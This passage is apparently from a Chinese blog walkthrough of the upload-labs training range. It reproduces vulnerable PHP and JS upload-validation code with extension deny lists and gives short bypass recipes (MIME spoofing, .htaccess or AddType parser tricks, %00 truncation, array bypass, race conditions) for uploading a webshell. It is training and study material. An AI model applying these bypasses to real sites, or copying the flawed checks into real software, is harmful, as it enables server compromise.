<span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>图片二次渲染，或者利用Apache解析漏洞条件竞争都可。</p>
<p>Apache解析漏洞参考链接：</p>
<p><a href="https://blog.csdn.net/qq_36374896/article/details/84189393">Apache HTTPD 未知后缀解析漏洞</a></p>
<h2 id="level-20"><a href="#level-20" class="headerlink" title="level-20"></a>level-20</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答:"></a>解答:</h3><p>%00截断或者继续解析漏洞。</p>
<p>可控post上去的文件名</p>
<p>直接文件包含也行。</p>
<h2 id="level-21"><a href="#level-21" class="headerlink" title="level-21"></a>level-21</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h3><p>数组加截断绕过，不详细复现了，给出参考链接和答案。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h3><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">文件解析漏洞总结</a></p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/104936689">upload-labs—wp（21关）</a></p>
<p><a href="https://blog.csdn.net/wo41ge/article/details/107313203">upload-labs 21关大合集</a></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/109537262?spm=1001.2014.3001.5501">CTFSHOW文件上传篇</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs学习</title>
    <url>/2021/04/22/upload-labs%E5%AD%A6%E4%B9%A0%E4%B8%8A%E7%AF%87/</url>
    <content><![CDATA[<h1 id="upload-labs靶场训练篇（windows版21题）1-13题"><a href="#upload-labs靶场训练篇（windows版21题）1-13题" class="headerlink" title="upload-labs靶场训练篇（windows版21题）1-13题"></a>upload-labs靶场训练篇（windows版21题）1-13题</h1><p>upload-labs为文件上传的训练靶场，目前一共有21关，基本涵盖了目前全部的文件上传漏洞。此篇为上篇。</p>
<span id="more"></span>
<h2 id="level-1-前端JS验证"><a href="#level-1-前端JS验证" class="headerlink" title="level-1(前端JS验证)"></a>level-1(前端JS验证)</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>在浏览器中直接执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checkfile&#x3D;[]</span><br></pre></td></tr></table></figure>
<p>使得前端返回array为空，即可上传一句话木马，拿到shell。</p>
<h2 id="level-2-后端PHP验证"><a href="#level-2-后端PHP验证" class="headerlink" title="level-2(后端PHP验证)"></a>level-2(后端PHP验证)</h2><h3 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>BP抓包，修改为：<code>image/png</code>即可绕过</p>
<h2 id="level-3-解析漏洞"><a href="#level-3-解析漏洞" class="headerlink" title="level-3(解析漏洞)"></a>level-3(解析漏洞)</h2><h3 id="源码：-2"><a href="#源码：-2" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><p>本题环境出了一些问题，Apache无法正常解析phps/phtml这样的后缀，因此只贴出做法。</p>
<p>使用前提：Apache的httpd.conf中有以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure>
<p>ban了几个关键字，绕就完事了。后缀改为上述内容。如果不开解析，将会变成注释或者直接输出在屏幕上。</p>
<h2 id="level-4-htaccess"><a href="#level-4-htaccess" class="headerlink" title="level-4(.htaccess)"></a>level-4(.htaccess)</h2><h3 id="源码：-3"><a href="#源码：-3" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p><del>全过滤了还怎么打</del></p>
<p>唯独放了一个<code>.htaccess</code>，只能构筑相应文件：</p>
<p>前提条件：（<code>1.mod_rewrite模块开启。2.AllowOverride All</code>）</p>
<p>此时，传上去的图片都会被解析成PHP文件。直接传马连a.png即可。</p>
<h2 id="level-5和10-空格-空格"><a href="#level-5和10-空格-空格" class="headerlink" title="level-5和10(.空格.空格)"></a>level-5和10(.空格.空格)</h2><h3 id="源码5"><a href="#源码5" class="headerlink" title="源码5:"></a>源码5:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span 